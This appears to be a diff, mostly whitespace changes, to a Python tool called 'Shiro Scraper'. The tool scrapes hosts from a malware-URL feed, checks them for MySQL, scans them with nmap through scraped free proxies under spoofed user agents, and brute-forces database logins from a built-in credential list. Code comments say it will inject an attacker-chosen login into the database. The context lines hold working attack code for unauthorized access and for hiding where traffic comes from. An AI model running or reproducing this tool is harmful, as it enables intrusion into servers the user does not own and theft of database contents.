@@ -28,13 +28,9 @@ except:
     os.system("pip3 install urllib3")
     import urllib.request    
 
-
 #change these credentials to your liking // this is the login you are going to inject into to the sql database
 adduser = "shiro"
 addpass = "rulesyou"
-
-
-
 
 #useragents [DO NOT TOUCH!]----------------------------------------------------------------------------------------------------------------------------
 useragent=["AdsBot-Google ( http://www.google.com/adsbot.html)",
@@ -467,7 +463,6 @@ useragent=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			]
 
 
-
 def proxyget(): 
 	try:
 		urlproxy = "http://free-proxy-list.net/"
@@ -479,12 +474,14 @@ def proxyget():
 		part = part[1].split("</tbody>")
 		part = part[0].split("<tr><td>")
 		proxies = ""
+		
 		for proxy in part:
 			proxy = proxy.split("</td><td>")
 			try:
 				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
 			except:
 				pass
+			
 		out_file = open("proxies.txt","w")
 		out_file.write("")
 		out_file.write(proxies)
@@ -493,9 +490,11 @@ def proxyget():
 		proxycount = 0
 		content = out_file.read()
 		proxylist = content.split("\n")
+		
 		for i in proxylist:
 		    if i:
 		         proxycount += 1
+				
 		print (f"\033[38;2;255;95;255m[\033[93m{proxycount}\033[38;2;255;95;255m] \033[38;2;255;95;255mProxies loaded")
 	except: 
 		print ("\n\033[38;2;225;0;0mERROR!\n")
@@ -504,11 +503,13 @@ def proxyget():
 
 import time
 import random
+
 def getproxies():
         global proxy
         global proxies
         global proxyip
         global useragent
+	
         try:
             proxies = open('proxies.txt').read().splitlines()
             proxyip = random.choice(proxies)
@@ -518,16 +519,13 @@ def getproxies():
         except:
             getproxies() #if proxy timed out, loop again
             pass
+	
         return proxy
-
-
-
-
-
 
 
 win = 'Windows'
 unix = 'Unix'
+
 if os.name == 'nt':
     OS = 'Windows'
 else:
@@ -538,42 +536,15 @@ if OS == win:
 else:
     os.system('clear')
 
-
 if OS == win:
    ctypes.windll.kernel32.SetConsoleTitleW(f"[Shiro Scraper ║ ~ By Lore]")
 else:
    sys.stdout.write(f"\x1b]2;[Shiro Scraper ║ ~ By Lore]\x07")
 
 
-
-
-
-
-
-
-
-
-
-
-
 banner = f"""\033[38;2;255;95;255m\033[38;2;255;95;255m╔\033[38;2;210;95;255m═\033[38;2;180;95;255m╗  \033[38;2;170;95;255m╦\033[38;2;160;95;255m \033[38;2;140;110;255m╦  \033[38;2;110;140;240m╦  \033[38;2;100;150;230m╦\033[38;2;90;160;220m═\033[38;2;70;180;200m╗  \033[38;2;60;190;190m╔\033[38;2;25;230;170m═\033[38;2;0;255;152m╗
 \033[38;2;255;95;255m\033[38;2;255;95;255m╚\033[38;2;210;95;255m═\033[38;2;180;95;255m╗  \033[38;2;170;95;255m╠\033[38;2;160;95;255m═\033[38;2;140;110;255m╣  \033[38;2;110;140;240m║  \033[38;2;100;150;230m╠\033[38;2;90;160;220m╦\033[38;2;70;180;200m╝  \033[38;2;60;190;190m║\033[38;2;25;230;170m \033[38;2;0;255;152m║
 \033[38;2;255;95;255m\033[38;2;255;95;255m╚\033[38;2;210;95;255m═\033[38;2;180;95;255m╝  \033[38;2;170;95;255m╩\033[38;2;160;95;255m \033[38;2;140;110;255m╩  \033[38;2;110;140;240m╩  \033[38;2;100;150;230m╩\033[38;2;90;160;220m╚\033[38;2;70;180;200m═  \033[38;2;60;190;190m╚\033[38;2;25;230;170m═\033[38;2;0;255;152m╝"""
-
-
-
-
-
-
-
-
-
-
-
-
-    
-
-
 
 
 creds = """
@@ -617,19 +588,15 @@ admin:pass
 """
 
 
-
-
-
 ips = []
 
 
-
 def portscan(ip):
-
         print("\033[38;5;99mScanning For \033[38;2;255;95;255mOpen \033[38;5;99mPorts...")
         nmap_scanner = nmap.PortScanner()
         state = 'scanning'
         nmapproxy = f"http://{proxyip}" 
+	
         while True:
            try:
                nmap_scanner.scan(ip,f'1-10000', f'-T4 -A -v --exclude-ports 21,22,23,25,53,69,80,443,3074,3306,5060,9307 --proxy {nmapproxy}')
@@ -651,10 +618,6 @@ def portscan(ip):
            pass
 
 
-
-
-
-
 def brute(ip, adduser, addpass):
     if CheckMysql(ip):
            print(f"\033[38;2;255;95;255m[\033[93m{ip}\033[38;2;255;95;255m] \033[38;2;0;255;152mHas MYSQL running...")
@@ -662,21 +625,27 @@ def brute(ip, adduser, addpass):
            print(f"\033[38;2;255;95;255m[\033[93m{ip}\033[38;2;255;95;255m] \033[38;5;196mdoesnt have MYSQL running...")
            print("")
            return
+	
     print(f"\033[38;2;105;145;235mAttempting To Brute SQL Server \033[38;2;255;95;255m[\033[93m{ip}\033[38;2;255;95;255m]")
+
     try:
             for combo in creds.splitlines():
                 if combo == '':
                     continue
+		
                 uname = combo[:combo.index(':')]
+		
                 try:
                     password = combo[combo.index(':')+1:]
                 except ValueError:
                     password = ''
+		
                 try:
                     conn = pymysql.connect(host=ip,user=uname,password=password,charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=5,write_timeout=5,connect_timeout=5)
                     print(f"\033[38;5;197mSQL \033[38;5;99mLOGIN \033[38;2;0;255;152mSUCCESSFUL \033[38;2;255;95;255m[\033[38;5;99m{uname}\033[38;2;255;95;255m] \033[38;2;255;95;255m[\033[38;5;99m{password}\033[38;2;255;95;255m]")
                     cursor = conn.cursor()
                     cursor.execute('show databases')
+			
                     for a_dict in cursor.fetchall():
                         for db in a_dict:
                             try:
@@ -694,8 +663,10 @@ def brute(ip, adduser, addpass):
                     pass
     except:
         pass
+
     print(f"\033[38;2;225;0;0mFAILED TO BRUTE SQL SERVER")
     print("")
+
 
 def CheckMysql(ip):
 
@@ -705,7 +676,6 @@ def CheckMysql(ip):
     try:
         s.connect((ip,3306))
         return True
-
     except:
         return False
 
@@ -714,6 +684,7 @@ def scraper():
     mirais = 0
     ipsfound = 0
     print("\033[38;2;0;255;152mStarting Shiro Scraper...")
+
     while True:
         try:        
            res = requests.get(f"https://urlhaus.abuse.ch/downloads/csv_recent/",proxies={"http": proxy, "https": proxy}, headers={"User-Agent":random.choice(useragent)})
@@ -736,6 +707,7 @@ def scraper():
 
             if not CheckMysql(ip):
                 continue
+		
             ips.append(ip)
             mirais +=1
             print(f"\n\033[38;2;255;95;255mMIRAI \033[38;5;99mFOUND \033[38;2;255;95;255m[\033[0;93m{ip}\033[38;2;255;95;255m]")
@@ -749,36 +721,25 @@ def scraper():
            pass
 
 
-
-
-
-
 def startclear():
     if OS == win:
         os.system('cls')
     else:
         os.system('clear')
-
-
-
-
-
-
-            
-            
-
+           
              
 if OS == win:
     os.system('cls')
 else:
     os.system('clear')
+
 print(banner)
 proxyget()
 print("\033[38;5;99mSpoofing All Requests...")
 getproxies()
+
 while True:
     try:
-        
         scraper()
     except KeyboardInterrupt:
         print("")
